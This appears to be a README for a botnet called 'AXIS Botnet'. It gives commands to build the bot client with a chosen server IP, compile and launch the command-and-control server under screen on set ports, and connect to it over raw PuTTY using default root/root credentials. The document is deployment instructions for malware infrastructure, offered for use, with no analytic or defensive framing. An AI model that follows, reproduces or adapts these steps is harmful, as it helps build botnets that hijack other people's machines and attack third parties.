# AXIS Botnet

### Installation:
* Linux only:
  * **recommended to use Centos 7**
  * `sudo python3 build.py AXIS_CC.c (server-ip)`
  * `gcc AXIS_CNC.c -o AXIS -pthread`
  * `sudo screen ./AXIS 606 1 909`
  
### Connect Putty
* SSH Config:
  * PORT: 909
  * TYPE: RAW
  
* Password (default)
  * username: root
  * password: root
  

